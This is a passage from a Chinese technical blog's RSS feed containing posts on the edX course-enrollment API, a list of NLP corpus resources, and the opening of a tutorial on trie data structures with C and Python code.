            &lt;span class="nt"&gt;&amp;quot;start_display&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2015年2月1日&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;start_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;timestamp&amp;quot;&lt;/span&gt;
        &lt;span class="p"&gt;}]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;值得关注的字段是&lt;code&gt;course_id&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;更多的字段信息参考文档 ：&lt;a href="http://edx.readthedocs.io/projects/edx-platform-api/en/latest/courses/courses.html#courses-api-courses-resource"&gt;courses-api-courses-resource&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;用户注册课程(选课)&lt;/h3&gt;
&lt;p&gt;文档参考:&lt;a href="http://edx.readthedocs.io/projects/edx-platform-api/en/latest/enrollment/enrollment.html#view-a-user-s-enrollments-or-enroll-a-user-in-a-course"&gt;View a User’s Enrollments or Enroll a User in a Course&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以下是命令行演示&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http POST "http://LMS_HOST/api/enrollment/v1/enrollment" course_details:=@course_details.json  "Authorization: Bearer user_access_token"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中必要的POST参数为course_details,文档中的其他参数可选,请求参数举例：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;course_details&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;course_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果后端返回200，则表示用户注册课程成功&lt;/p&gt;
&lt;p&gt;当然你也可以在浏览器中直接访问&lt;code&gt;"http://LMS_HOST/api/enrollment/v1/enrollment&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果你想进一步拓展后端的RESTful接口，可以参考我的这个项目：&lt;a href="https://github.com/wwj718/edx_siteapi"&gt;edx_siteapi&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;p&gt;移动端已经有选课功能了，如果你决定直接使用既有功能，可能需要做个调整，请求&lt;code&gt;http://LMS_HOST/api/courses/v1/courses/?username=mooctest&amp;amp;mobile=true&amp;amp;page=1&lt;/code&gt;会报403，进入后台将&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/djangoapps/course_api/views.py#L110"&gt;CourseListView&lt;/a&gt;里的&lt;code&gt;username = self.request.query_params.get('username', self.request.user.username)&lt;/code&gt;改为&lt;code&gt;self.request.user.username&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 15 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-15:edx-mobile-enrollment.html</guid><category>edx</category></item><item><title>自然语言处理之语料库资源</title><link>/NLP-corpus.html</link><description>&lt;blockquote&gt;
&lt;p&gt;巧妇难为无米之炊&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;语料库&lt;/h1&gt;
&lt;p&gt;语料库（corpus）一词在语言学上意指大量的文本，是在语言的实际使用中真实出现过的语言材，通常经过整理，具有既定格式与标记&lt;/p&gt;
&lt;p&gt;事实上，语料库英文 "text corpus" 的涵意即为 "body of text"。&lt;/p&gt;
&lt;p&gt;语料库是语料库语言学研究的基础资源，也是经验主义语言研究方法的主要资源。&lt;/p&gt;
&lt;p&gt;本文主要关注中文语料库（顺便一提英文语料库）&lt;/p&gt;
&lt;h3&gt;英文语料库&lt;/h3&gt;
&lt;p&gt;NLTK的&lt;a href="https://github.com/nltk/nltk_data"&gt;nltk_data&lt;/a&gt;囊括数个在 NLP 研究圈里广泛使用的实用语料库，针对英文的自然语言处理，已经成果显著，资源也易于获取，这里列出一些不错的语料库，我们更多的精力放在中文语料库上&lt;/p&gt;
&lt;p&gt;先列出NLTK里的语料库：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;布朗语料库（Brown Corpus）：第一个可以在计算语言学处理中使用的通用英语语料库。它包含了一百万字 1961 年出版的美语文本。它代表了通用英语的样本，采样自小说，新闻和宗教文本。随后，在大量的人工标注后，诞生了词性标注过的版本。&lt;/li&gt;
&lt;li&gt;古登堡语料库（Gutenberg Corpus）：古登堡计划（Gutenberg Project）致力于将文化作品的数字化和归档，并鼓励创作和发行电子书。古登堡语料库选择了 14 个文本，整个语料库包含了一百七十万字v&lt;/li&gt;
&lt;li&gt;Stopwords Corpus：NLTK 所收集的停用词语料库（Stopwords Corpus）包含了 来自 11 种不同语言（包括英语）的 2400 个停用词&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其他的著名语料库&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://corpus.byu.edu/coca/"&gt;美国当代英语语料库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.collinslanguage.com/"&gt;柯林斯英语语料库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://sara.natcorp.ox.ac.uk/"&gt;英国国家语料库&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;中文语料库&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dumps.wikimedia.org/zhwiki/"&gt;维基百科中文@维基dump&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;使用：&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.52nlp.cn/%E4%B8%AD%E8%8B%B1%E6%96%87%E7%BB%B4%E5%9F%BA%E7%99%BE%E7%A7%91%E8%AF%AD%E6%96%99%E4%B8%8A%E7%9A%84word2vec%E5%AE%9E%E9%AA%8C"&gt;中英文维基百科语料上的Word2Vec实验&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://licstar.net/archives/262"&gt;维基百科简体中文语料的获取&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/hereiskxm/article/details/49664845"&gt;用wiki百科中文语料训练word2vec模型&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pan.baidu.com/s/1bnhXX6Z"&gt;搜狗20061127新闻语料(包含分类)@百度盘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://pan.baidu.com/s/1gdJJ1FP"&gt;分词库(语料)&lt;/a&gt;：包含非常多的各行业词汇&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.nlpcn.org/resource/list/2"&gt;中国自然语言开源组织(nlpcn)语料资源&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cncorpus.org/Resources.aspx"&gt;国家语委现代汉语语料库&lt;/a&gt; ：现代汉语语料库在线提供免费检索的语料约2000万字，为分词和词性标注语料
    &lt;a href="http://www.cncorpus.org/ACindex.aspx"&gt;古代汉语语料库&lt;/a&gt;：提供了分词、词性标注软件、词频统计、字频统计软件&lt;/li&gt;
&lt;li&gt;&lt;a href="http://app.sinica.edu.tw/kiwi/mkiwi/"&gt;台湾中央研究院&lt;/a&gt;：有丰富的语料库&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bcc.blcu.edu.cn/"&gt;BCC语料库&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nlp.blcu.edu.cn/research"&gt;资源下载&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.datatang.com/data/list"&gt;数据堂&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;github的一些资源&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/nonamestreet/weixin_public_corpus"&gt;weixin_public_corpus&lt;/a&gt;  微信公众号语料库，目前数据大约3G&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/shijiebei2009/CEC-Corpus"&gt;CEC-Corpus&lt;/a&gt;：中文突发事件语料库&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ml-distribution/chinese-corpus"&gt;chinese-corpus&lt;/a&gt;  中文相关词典和语料库&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;搜狗实验室&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.sogou.com/labs/resource/w.php"&gt;互联网词库(SogouW)&lt;/a&gt;：搜狗实验室&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;其他&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/first20hours/google-10000-english"&gt;google-10000-english&lt;/a&gt;：list of the 10,000 most common English words in order of frequency, as determined by n-gram frequency analysis of the Google's Trillion Word Corpus&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/dariusk/corpora"&gt;corpora&lt;/a&gt;：A collection of small corpuses of interesting data for the creation of bots and similar stuff.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/clips/pattern"&gt;pattern&lt;/a&gt;  从互联网获取语料&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="www.lingviko.net/feng/05-23-final.pdf"&gt;应用语言学中的语料库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.douban.com/note/269081724/"&gt;【汇总】语料库资源&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.sina.com.cn/s/blog_66dfbcca0100r3ex.html"&gt;国内可用免费语料库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.52nlp.cn/nlp%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E7%9B%9B%E5%AE%B4"&gt;NLP资源共享盛宴&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/85094/"&gt;Python自然语言处理入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/206caa232ded"&gt;中文文本语料库整理&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 13 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-13:NLP-corpus.html</guid><category>data</category></item><item><title>算法笔记之trie树</title><link>/algorithm-trie.html</link><description>&lt;p&gt;&lt;img alt="一个保存了8个键的trie结构" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Trie_example.svg/512px-Trie_example.svg.png" /&gt;&lt;/p&gt;
&lt;p&gt;图片来自维基百科&lt;/p&gt;
&lt;h1&gt;介绍&lt;/h1&gt;
&lt;p&gt;trie，又称前缀树/字典树/单词查找树，是一种有序树&lt;/p&gt;
&lt;p&gt;Trie的核心思想是&lt;code&gt;空间换时间&lt;/code&gt;，利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的&lt;/p&gt;
&lt;h3&gt;上图图示说明&lt;/h3&gt;
&lt;p&gt;图示中，键标注在节点中，值标注在节点之下。每一个完整的英文单词对应一个特定的整数。Trie可以看作是一个确定有限状态自动机。键不需要被显式地保存在节点中。图示中标注出完整的单词，只是为了演示trie的原理&lt;/p&gt;
&lt;h3&gt;读音&lt;/h3&gt;
&lt;p&gt;trie的发明者Edward Fredkin把它读作英语发音："tree"。但是，其他作者把它读作英语发音："try"。&lt;/p&gt;
&lt;h3&gt;基本特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;根结点不包含字符，除根节点意外每个结点只包含一个字符&lt;/li&gt;
&lt;li&gt;从根结点到某个结点，经过的字符连接起来，为该结点对应的字符串&lt;/li&gt;
&lt;li&gt;每个节点的所有子节点包含的字符都不相同&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;基本操作&lt;/h3&gt;
&lt;p&gt;基本操作有：查找、插入和删除,当然删除操作比较少见&lt;/p&gt;
&lt;h3&gt;应用&lt;/h3&gt;
&lt;p&gt;典型应用是用于统计，排序和保存大量的字符串（但不仅限于字符串）&lt;/p&gt;
&lt;p&gt;trie树常用于搜索提示。如当输入一个网址，可以自动搜索出可能的选择。当没有完全匹配的搜索结果，可以返回前缀最相似的可能&lt;/p&gt;
&lt;p&gt;在我们做NLP中命名实体识别（NER），采用字典法时，可能会用到trie-tree作为快速搜索算法&lt;/p&gt;
&lt;h1&gt;可视化&lt;/h1&gt;
&lt;p&gt;&lt;iframe src="https://people.ok.ubc.ca/ylucet/DS/Trie.html" width="100%" height="700px"&gt;&lt;/iframe&gt;&lt;/p&gt;
&lt;h1&gt;C语言实现&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define MAX 26&lt;/span&gt;&lt;span class="c1"&gt;//字符集大小&lt;/span&gt;
&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;TrieNode&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;nCount&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;//记录该字符出现次数&lt;/span&gt;
    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;TrieNode&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;MAX&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="n"&gt;TrieNode&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="n"&gt;TrieNode&lt;/span&gt; &lt;span class="n"&gt;Memory&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1000000&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;allocp&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="cm"&gt;/*初始化*/&lt;/span&gt;
&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;InitTrieRoot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TrieNode&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pRoot&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pRoot&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cm"&gt;/*创建新结点*/&lt;/span&gt;
&lt;span class="n"&gt;TrieNode&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nf"&gt;CreateTrieNode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;TrieNode&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;Memory&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;allocp&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;nCount&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;MAX&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cm"&gt;/*插入*/&lt;/span&gt;
&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;InsertTrie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TrieNode&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pRoot&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;inti&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;TrieNode&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=*&lt;/span&gt;&lt;span class="n"&gt;pRoot&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=*&lt;/span&gt;&lt;span class="n"&gt;pRoot&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CreateTrieNode&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;//确定branch&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
            &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CreateTrieNode&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
                &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;nCount&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;//查找&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;SearchTrie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TrieNode&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pRoot&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;TrieNode&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=*&lt;/span&gt;&lt;span class="n"&gt;pRoot&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;return0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;nCount&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;python描述&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; Tries in python&lt;/span&gt;
&lt;span class="sd"&gt;Methods -  insert_key(k, v)&lt;/span&gt;
&lt;span class="sd"&gt;           has_key(k)&lt;/span&gt;
&lt;span class="sd"&gt;           retrie_val(k)&lt;/span&gt;
&lt;span class="sd"&gt;           start_with_prefix(prefix)&lt;/span&gt;
&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_get_child_branches&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Helper method for getting branches&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_get_child_branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
